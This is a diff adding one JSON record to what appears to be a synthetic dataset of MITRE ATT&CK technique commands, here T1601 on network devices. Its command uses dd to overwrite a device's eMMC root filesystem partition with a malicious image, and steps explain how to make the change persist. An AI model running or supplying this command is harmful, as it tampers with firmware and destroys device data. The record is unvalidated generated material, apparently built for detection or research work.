@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Linux-based CLI",
+  "command": "echo 'T1601 patch: overwrite eMMC rootfs partition'; dd if=/tmp/mal_rootfs.img of=/dev/mmcblk0p2 bs=4M conv=fsync && sync",
+  "explanation": "Writes a malicious rootfs image directly to an eMMC partition commonly used on modern switches/routers, modifying the bootable system image.",
+  "rationale_steps": [
+    "Target the correct eMMC partition holding the root filesystem.",
+    "Use dd with large blocks and fsync to ensure reliable on-disk writes.",
+    "Commit changes to persist across device reboots."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-LINUX-BASED CLI-T1601-d3d2d345-21a9400f",
+  "source_prompt_hash": "d3d2d345",
+  "timestamp_utc": "2025-09-30T02:47:56.896050Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
